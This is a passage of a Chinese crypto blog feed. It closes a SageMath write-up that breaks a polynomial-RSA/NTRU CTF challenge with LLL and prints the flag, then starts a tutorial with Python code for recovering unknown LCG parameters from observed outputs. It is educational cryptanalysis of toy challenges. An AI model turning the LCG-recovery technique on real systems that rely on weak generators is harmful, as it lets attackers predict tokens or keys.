28311*x^39 + 9568*x^38 + 30893*x^37 + 52854*x^36 + 62273*x^35 + 16301*x^34 + 16813*x^33 + 332*x^32 + 29510*x^31 + 35734*x^30 + 40620*x^29 + 45814*x^28 + 13617*x^27 + 32390*x^26 + 20408*x^25 + 29592*x^24 + 29371*x^23 + 38285*x^22 + 31251*x^21 + 42643*x^20 + 18278*x^19 + 59146*x^18 + 63302*x^17 + 30859*x^16 + 45479*x^15 + 28623*x^14 + 39912*x^13 + 60407*x^12 + 57226*x^11 + 19226*x^10 + 32015*x^9 + 22768*x^8 + 55340*x^7 + 40292*x^6 + 8936*x^5 + 406*x^4 + 9747*x^3 + 51631*x^2 + 5686*x + 43925,1)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = (<span class="number">64621</span> ^ <span class="number">97</span> - <span class="number">1</span>) * (<span class="number">64621</span> ^ <span class="number">78</span> - <span class="number">1</span>)</span><br><span class="line"><span class="comment">#这里见上一篇多项式RSA</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="built_in">pow</span>(c2, d, N)</span><br><span class="line"> <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#88520242910362871448352317137540300262448941340486475602003226117035863930302</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">h = <span class="number">88520242910362871448352317137540300262448941340486475602003226117035863930302</span></span><br><span class="line">p1 = <span class="number">106472061241112922861460644342336453303928202010237284715354717630502168520267</span></span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p1])</span><br><span class="line">m = matrix([v1,v2])</span><br><span class="line">shortest_vector = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = shortest_vector</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"><span class="comment">#183610829622016944154542682943585488074 228679177303871981036829786447405151037</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">g1 = <span class="number">228679177303871981036829786447405151037</span></span><br><span class="line">n = <span class="number">31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ^ <span class="number">20</span>):</span><br><span class="line">    g = g1 ^^ i</span><br><span class="line">    <span class="keyword">if</span> GCD(n, g) == g:</span><br><span class="line">        <span class="built_in">print</span>(g)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#228679177303871981036829786447405216349</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g = <span class="number">228679177303871981036829786447405216349</span></span><br><span class="line">q = n // g</span><br><span class="line">phi_n = (g - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">c = <span class="number">20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(flag))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag)))</span><br><span class="line"><span class="comment">#&lt;class 'sage.rings.finite_rings.integer_mod.IntegerMod_gmp'&gt;</span></span><br><span class="line"><span class="comment">#b'DASCTF{P01yn0m141RS4_W17h_NTRU}'</span></span><br></pre></td></tr></table></figure></li></ul><h2><span id="wiki-ntruencrypt-截图">wiki-NTRUEncrypt 截图</span></h2><p><img src="NTRUEncrypto.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原理等来自相关链接：&lt;a href=&quot;https://blog.csdn.net/sinat_36742186/article/details/83689529&quot;&gt;NTRU-密码学&lt;/a&gt;|&lt;a href=&quot;https://www.cnblogs.com/xdyixia/p</summary>
      
    
    
    
    <category term="Crypto" scheme="https://feverhu.github.io/categories/Crypto/"/>
    
    
    <category term="RSA" scheme="https://feverhu.github.io/tags/RSA/"/>
    
    <category term="NTRU" scheme="https://feverhu.github.io/tags/NTRU/"/>
    
  </entry>
  
  <entry>
    <title>解决LCG未知参数的办法</title>
    <link href="https://feverhu.github.io/2022/09/16/%E8%A7%A3%E5%86%B3LCG%E6%9C%AA%E7%9F%A5%E5%8F%82%E6%95%B0%E7%9A%84%E5%8A%9E%E6%B3%95/"/>
    <id>https://feverhu.github.io/2022/09/16/%E8%A7%A3%E5%86%B3LCG%E6%9C%AA%E7%9F%A5%E5%8F%82%E6%95%B0%E7%9A%84%E5%8A%9E%E6%B3%95/</id>
    <published>2022-09-16T03:53:58.000Z</published>
    <updated>2022-09-28T17:03:48.332Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://dawnwhisper.github.io/2021/03/04/LCG/">Dawn_whisper : LCG</a></p><h3><span id="1-线性同余生成方法">1、线性同余生成方法</span></h3><p>设<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="7.804ex" height="2.059ex" role="img" focusable="false" viewbox="0 -716 3449.3 910"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"/></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(1194.7,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"/></g><g data-mml-node="mo" transform="translate(1953.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mi" transform="translate(2398.3,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/></g></g></g></svg></mjx-container></span>是一定常数，按照递推公式<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="37.233ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 16457 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/></g><g data-mml-node="mi" transform="translate(469,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/></g><g data-mml-node="mi" transform="translate(830,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(1359,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/></g><g data-mml-node="msub" transform="translate(1720,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="TeXAtom" transform="translate(499,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g><g data-mml-node="mo" transform="translate(3694.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mo" transform="translate(4750.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(5139.2,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"/></g><g data-mml-node="mo" transform="translate(6111.4,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"/></g><g data-mml-node="mi" transform="translate(7111.6,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/></g><g data-mml-node="mi" transform="translate(7580.6,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/></g><g data-mml-node="mi" transform="translate(7941.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(8470.6,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/></g><g data-mml-node="msub" transform="translate(8831.6,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(9846.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(10847,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"/></g><g data-mml-node="mo" transform="translate(11606,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mtext" transform="translate(11995,0)"><path data-c="A0" d=""/></g><g data-mml-node="mo" transform="translate(12245,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mtext" transform="translate(12634,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(12884,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(13762,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(14247,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mtext" transform="translate(14767,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(15017,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/></g><g data-mml-node="mo" transform="translate(16068,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span></p><p>其中A称为乘数(multiplier)，B称为增量(increment)，M称为模数(modulus)</p><p>LCG的生成周期理论上应该是M，但大部分情况下会小于M，如果想要追求LCG的最大周期，应符合以下几个条件：</p><ul><li><p>A与B都是正整数</p></li><li><p>A、B、N[0]都比M要小</p></li><li><p>B与M互质</p></li><li><p>M的所有质因数都能整除A-1</p></li></ul><h3><span id="2-攻击方法">2、攻击方法</span></h3><p>理论上知道<strong>2</strong>个值可以知道B。<strong>3</strong>个状态值可以知道A和B。<strong>7</strong>个状态值<strong>可能</strong>知道A,B,M。</p><p>example-one:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">class lcg_attack:</span><br><span class="line">    # unknown B (increment)</span><br><span class="line">    def lcgattack1(self, states, modulus, multiplier):</span><br><span class="line">        if(len(states)&lt;2):</span><br><span class="line">            raise Exception("#####Invalid lenth of states! The lenth should be 2 at least!##### - Dawn_whisper")</span><br><span class="line">        increment = (states[1] - states[0] * multiplier) % modulus</span><br><span class="line">        return {'multiplier':int(multiplier), 'increment':int(increment), 'modulus':int(modulus)}</span><br><span class="line"></span><br><span class="line">    # unknown A (multiplier)</span><br><span class="line">    def lcgattack2(self, states, modulus):</span><br><span class="line">        if(len(states)&lt;3):</span><br><span class="line">            raise Exception("#####Invalid lenth of states! The lenth should be 3 at least!##### - Dawn_whisper")</span><br><span class="line">        multiplier = (states[2] - states[1]) * inverse(states[1] - states[0], modulus) % modulus</span><br><span class="line">        return self.lcgattack1(states, modulus, multiplier)</span><br><span class="line">    </span><br><span class="line">    # unknown M (modulus)</span><br><span class="line">    def lcgattack3(self, states):</span><br><span class="line">        if(len(states)&lt;6):</span><br><span class="line">            raise Exception("#####Invalid lenth of states! The lenth should be 6 at least!##### - 